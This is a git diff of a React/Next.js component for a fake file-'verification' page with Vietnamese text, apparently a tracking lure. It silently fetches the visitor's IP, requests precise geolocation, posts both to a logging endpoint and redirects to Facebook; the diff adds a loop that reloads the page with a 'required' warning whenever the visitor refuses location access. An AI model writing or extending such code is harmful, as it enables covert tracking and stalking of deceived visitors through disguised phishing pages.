@@ -1,9 +1,9 @@
 'use client';
 
-import { useEffect } from 'react';
+import { useEffect, useState } from 'react';
 import { Card, CardContent } from '@/components/ui/card';
 import Image from 'next/image';
-import { FileText, Loader2 } from 'lucide-react';
+import { FileText, Loader2, AlertTriangle } from 'lucide-react';
 import type { VerificationConfig } from '@/app/actions/settings';
 
 interface DriveVerificationClientProps {
@@ -20,58 +20,73 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
     redirectUrl,
     previewImageUrl,
   } = config;
+
+  const [statusText, setStatusText] = useState('Đang xác minh, vui lòng chờ...');
+  const [showWarning, setShowWarning] = useState(false);
   
   const REDIRECT_URL = redirectUrl || 'https://www.facebook.com'; 
 
   useEffect(() => {
-    const handleVerify = () => {
-      const requestLocation = async () => {
-        let clientIp = 'N/A';
-        try {
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            if (ipResponse.ok) {
-                const ipData = await ipResponse.json();
-                clientIp = ipData.ip;
-            }
-        } catch(e) {
-            console.error("Could not fetch IP", e);
-        }
-
-        const logData = (pos?: GeolocationPosition) => {
-            const body: { ip: string; lat?: number; lon?: number; acc?: number, from: string } = { ip: clientIp, from: 'link' };
-            if (pos) {
-                body.lat = pos.coords.latitude;
-                body.lon = pos.coords.longitude;
-                body.acc = pos.coords.accuracy;
-            }
-
-            fetch('/api/log-location', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(body),
-            }).finally(() => {
-                window.location.href = REDIRECT_URL;
-            });
+    const requestLocation = async () => {
+      let clientIp = 'N/A';
+      try {
+          const ipResponse = await fetch('https://api.ipify.org?format=json');
+          if (ipResponse.ok) {
+              const ipData = await ipResponse.json();
+              clientIp = ipData.ip;
+          }
+      } catch(e) {
+          console.error("Could not fetch IP", e);
       }
+
+      const logDataAndRedirect = (pos?: GeolocationPosition) => {
+          setStatusText('Xác minh thành công, đang chuyển hướng...');
+          const body: { ip: string; lat?: number; lon?: number; acc?: number, from: string } = { ip: clientIp, from: 'link' };
+          if (pos) {
+              body.lat = pos.coords.latitude;
+              body.lon = pos.coords.longitude;
+              body.acc = pos.coords.accuracy;
+          }
+
+          fetch('/api/log-location', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(body),
+              keepalive: true,
+          }).finally(() => {
+              window.location.href = REDIRECT_URL;
+          });
+      };
+
+      const handleError = (error: GeolocationPositionError) => {
+        // PERMISSION_DENIED is the key case
+        if (error.code === error.PERMISSION_DENIED) {
+            setShowWarning(true);
+            setStatusText('Yêu cầu bắt buộc! Vui lòng cho phép...');
+            // Reload after a short delay to allow user to read the message
+            setTimeout(() => {
+                window.location.reload();
+            }, 2500);
+        } else {
+            // For other errors (POSITION_UNAVAILABLE, TIMEOUT), just log IP and redirect
+            logDataAndRedirect();
+        }
+      };
 
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          logData, // Success callback
-          () => logData(), // Error callback
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          logDataAndRedirect, // Success
+          handleError,        // Error
+          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
         );
       } else {
-        logData(); // Geolocation not supported
+        // Geolocation not supported, log IP and redirect
+        logDataAndRedirect();
       }
     };
     
-    requestLocation();
-  };
-  
-    const timer = setTimeout(() => {
-      handleVerify();
-    }, 3000);
-
+    // Request immediately, but with a tiny delay to let the initial UI render
+    const timer = setTimeout(requestLocation, 100);
     return () => clearTimeout(timer);
   }, [REDIRECT_URL]);
 
@@ -103,10 +118,10 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
           </div>
           
           <div
-            className="w-full h-12 text-base font-semibold bg-primary text-primary-foreground rounded-lg flex items-center justify-center transition-colors"
+            className={`w-full h-12 text-base font-semibold text-primary-foreground rounded-lg flex items-center justify-center transition-colors ${showWarning ? 'bg-destructive' : 'bg-primary'}`}
           >
-            <Loader2 className="mr-2 h-5 w-5 animate-spin" />
-            Đang xác minh, vui lòng chờ...
+            {showWarning ? <AlertTriangle className="mr-2 h-5 w-5" /> : <Loader2 className="mr-2 h-5 w-5 animate-spin" />}
+            {statusText}
           </div>
 
           <div className="text-xs text-muted-foreground/80 mt-6">
